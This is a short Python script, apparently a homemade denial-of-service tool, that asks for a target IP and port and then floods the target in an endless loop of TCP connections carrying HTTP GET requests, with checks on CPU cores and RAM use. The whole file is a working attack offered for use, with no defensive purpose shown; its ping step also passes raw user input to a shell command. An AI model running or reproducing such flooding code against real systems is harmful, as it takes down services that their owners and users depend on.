import socket
import threading
import psutil
import os

class DoSAttack:
    def __init__(self):
        self.target_ip = input("Target IP: ")
        self.target_port = int(input("Target Port: "))
        self.max_ram = int(input("Max RAM Usage (%): "))
        self.num_threads = int(input("Number of Threads: "))

    def start_attack(self):
        if self.num_threads > psutil.cpu_count():
            print("Number of threads exceeds available CPU cores.")
            return

        if self.num_threads > 64:
            print("Number of threads cannot exceed 64.")
            return

        if self.target_ip == socket.gethostbyname(socket.gethostname()):
            print("Do not target your own IP address.")
            return

        if not self.ping(self.target_ip):
            print("Ping to target IP failed. Target IP might be fake.")
            return

        self.attack()

    def ping(self, target_ip):
        response = os.system("ping -n 1 " + target_ip)  # Windows 환경에서의 Ping 명령어
        return response == 0  # 응답이 있는지 확인

    def attack(self):
        while True:
            try:
                current_ram = psutil.virtual_memory().percent
                if current_ram >= self.max_ram:
                    print(f"Current RAM usage is {current_ram}%. Maximum allowed RAM usage is {self.max_ram}%. Attack stopped.")
                    return

                for _ in range(self.num_threads):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((self.target_ip, self.target_port))
                    s.sendto(("GET /" + self.target_ip + " HTTP/1.1\r\n").encode('ascii'), (self.target_ip, self.target_port))
                    s.sendto(("Host: " + self.target_ip + "\r\n\r\n").encode('ascii'), (self.target_ip, self.target_port))
                    s.close()
            except:
                pass

if __name__ == "__main__":
    attack = DoSAttack()
    attack.start_attack()
